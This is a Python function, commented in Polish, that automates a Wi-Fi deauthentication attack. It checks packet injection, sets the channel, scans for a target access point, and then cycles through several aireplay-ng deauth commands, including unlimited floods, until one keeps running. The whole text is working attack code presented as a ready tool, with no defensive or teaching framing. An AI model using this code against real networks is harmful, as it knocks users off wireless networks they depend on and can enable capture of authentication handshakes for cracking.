def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS, ATTACK_RUNNING
    bssid = target["bssid"]
    channel = target["channel"]
    
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    # Testowanie interfejsu
    logging.info("Testing interface %s...", interface)
    test_result = subprocess.run(
        ["aireplay-ng", "--test", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    if test_result.returncode == 0:
        logging.info(color_text("✓ Interface test passed", COLOR_SUCCESS))
        if "Injection is working!" in test_result.stdout:
            logging.info(color_text("✓ Packet injection working", COLOR_SUCCESS))
    else:
        logging.warning("Interface test issues: %s", test_result.stderr[:100])
    
    # Ustaw kanał jeśli znany
    if channel:
        logging.info("Setting channel %s on %s...", channel, interface)
        channel_result = subprocess.run(
            ["iw", "dev", interface, "set", "channel", str(channel)],
            stderr=subprocess.PIPE,
            text=True,
        )
        if channel_result.returncode != 0:
            logging.warning("Could not set channel: %s", channel_result.stderr.strip())
    
    # SPRAWDŹ CZY WIDZISZ CELEWY BSSID
    logging.info("\nChecking for target BSSID %s...", bssid)
    scan_result = subprocess.run(
        ["iw", "dev", interface, "scan"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    target_found = False
    if scan_result.returncode == 0:
        for line in scan_result.stdout.splitlines():
            if bssid.lower() in line.lower():
                target_found = True
                break
    
    if not target_found:
        logging.warning("⚠ Target BSSID not found in scan!")
        logging.warning("Make sure you're on the correct channel and in range.")
        proceed = input("Continue anyway? (y/n): ").strip().lower()
        if proceed != 'y':
            return False
    
    # URUCHOM ATAK Z WIĘKSZĄ LICZBĄ PAKIETÓW
    logging.info("\nStarting aggressive deauth attack on %s...", bssid)
    
    # Próbuj różne opcje aireplay-ng:
    options_to_try = [
        # Standard
        ["aireplay-ng", "-0", "0", "-a", bssid, interface],
        # Z konkretną stacją (jeśli znasz MAC klienta)
        # ["aireplay-ng", "-0", "0", "-a", bssid, "-c", "CLIENT_MAC", interface],
        # Z większą szybkością
        ["aireplay-ng", "-0", "1000", "-a", bssid, interface],
        # Z określonym interwałem
        ["aireplay-ng", "-0", "0", "-a", bssid, "-x", "100", interface],
    ]
    
    for i, cmd in enumerate(options_to_try):
        if i == 0:
            # Pierwsza próba - standardowa
            logging.info("Trying standard attack...")
        else:
            logging.info("Trying alternative method %d...", i)
            stop_attack()
            time.sleep(1)
        
        try:
            ATTACK_PROCESS = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,  # ZMIENIONE: czytaj stdout
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid,
            )
            
            # Czytaj output przez 5 sekund żeby zobaczyć co się dzieje
            for _ in range(5):
                if ATTACK_PROCESS.poll() is not None:
                    break
                    
                # Sprawdź czy są jakieś komunikaty
                try:
                    output = ATTACK_PROCESS.stdout.read(1024) if ATTACK_PROCESS.stdout else ""
                    if output:
                        logging.info("aireplay-ng: %s", output.strip())
                        
                    error = ATTACK_PROCESS.stderr.read(1024) if ATTACK_PROCESS.stderr else ""
                    if error:
                        logging.warning("aireplay-ng error: %s", error.strip())
                except:
                    pass
                    
                time.sleep(1)
            
            # Jeśli proces nadal działa, kontynuuj
            if ATTACK_PROCESS.poll() is None:
                logging.info(color_text("✓ Attack running (method %d)", COLOR_SUCCESS), i+1)
                ATTACK_RUNNING = True
                return True
            else:
                exit_code = ATTACK_PROCESS.poll()
                logging.warning("Attack stopped with code %d, trying next method...", exit_code)
                
        except Exception as exc:
            logging.error("Error with method %d: %s", i+1, exc)
    
    logging.error("All attack methods failed!")
    return False